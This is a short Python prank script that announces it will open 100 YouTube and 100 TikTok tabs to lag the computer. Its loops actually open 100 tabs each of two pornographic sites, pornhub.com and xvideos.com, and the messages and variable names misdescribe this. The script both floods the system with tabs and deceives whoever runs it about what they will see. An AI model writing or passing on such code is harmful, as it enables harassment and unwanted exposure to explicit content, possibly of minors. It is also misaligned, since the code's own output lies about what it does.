import webbrowser

print("YouTube + TikTok Rapid Lag - Python Version")
print("Opening 100 YouTube + 100 TikTok tabs as fast as possible...")
print("This will cause heavy lag quickly!")
print("Use Task Manager (Ctrl + Shift + Esc) to kill browser processes if it gets too much.")

# Change these numbers if you want more or less lag
yt_count = 100
tt_count = 100

print(f"\nLaunching {yt_count} YouTube tabs...")
for i in range(yt_count):
    webbrowser.open("https://pornhub.com", new=0, autoraise=False)

print(f"Launching {tt_count} TikTok tabs...")
for i in range(tt_count):
    webbrowser.open("https://xvideos.com", new=0, autoraise=False)

print("\nAll tabs launched!")
print("If your computer becomes unresponsive, force close browser processes in Task Manager.")
input("\nPress Enter to close this window...")